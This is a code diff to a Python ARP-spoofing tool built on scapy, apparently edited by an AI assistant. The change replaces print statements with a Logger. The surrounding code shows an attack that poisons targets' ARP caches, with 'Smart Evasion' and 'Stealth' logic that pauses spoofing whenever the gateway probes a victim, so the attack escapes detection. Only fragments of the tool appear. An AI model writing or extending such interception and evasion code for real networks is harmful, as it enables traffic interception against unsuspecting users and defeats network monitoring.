@@ -5,6 +5,7 @@ import sys
 import random
 from typing import List, Dict, Set
 from scapy.all import ARP, Ether, send, sendp, sniff
+from network_monitor.logger import Logger
 
 class ARPSpoofer:
     def __init__(self, interface: str, gateway_ip: str):
@@ -20,9 +21,9 @@ class ARPSpoofer:
         self.pause_duration = 10.0 # Seconds to pause if Gateway asks for a victim
         
         if not self.gateway_mac:
-            print(f"Warning: Could not resolve Gateway MAC for {gateway_ip}")
+            Logger.warning(f"Could not resolve Gateway MAC for {gateway_ip}")
         else:
-            print(f"[*] Gateway Resolved: {gateway_ip} -> {self.gateway_mac}")
+            Logger.info(f"Gateway Resolved: {gateway_ip} -> {self.gateway_mac}")
 
     def _get_mac(self, ip):
         # ... (Same as before, simplified for brevity in this view, but I must provide full content if replacing block)
@@ -115,7 +116,7 @@ class ARPSpoofer:
 
     def _monitor_gateway_arp(self):
         """Listens for ARP requests from Gateway. If Gateway asks 'Who has X?', stop spoofing X."""
-        print("[*] Smart Evasion Active: Listening for Gateway ARP checks...")
+        Logger.info("Smart Evasion Active: Listening for Gateway ARP checks...")
         
         def _pkt_callback(pkt):
             if not self.running: return
@@ -132,7 +133,7 @@ class ARPSpoofer:
                             is_target = any(t[0] == target_ip for t in self.targets)
                         
                         if is_target:
-                            print(f"[!] Stealth: Gateway asks for {target_ip}. Pausing spoofing for {self.pause_duration}s.")
+                            Logger.warning(f"Stealth: Gateway asks for {target_ip}. Pausing spoofing for {self.pause_duration}s.")
                             with self.lock:
                                 self.paused_targets[target_ip] = time.time() + self.pause_duration
 
@@ -148,7 +149,7 @@ class ARPSpoofer:
                     del self.paused_targets[ip]
                 
                 if self.gateway_mac:
-                    print(f"[DEBUG] Sending ARP spoof for {len(self.targets)} targets") # Debug
+                    Logger.debug(f"Sending ARP spoof for {len(self.targets)} targets") # Debug
                     for target_ip, target_mac in self.targets:
                         # Skip if paused
                         if target_ip in self.paused_targets:
@@ -172,7 +173,7 @@ class ARPSpoofer:
         sendp(packet, verbose=False, iface=self.interface)
 
     def _restore(self):
-        print("[*] Restoring ARP tables...")
+        Logger.info("Restoring ARP tables...")
         # 1. Broadcast restore for Gateway (Fixes all Users efficiently)
         self.restore_all()
         
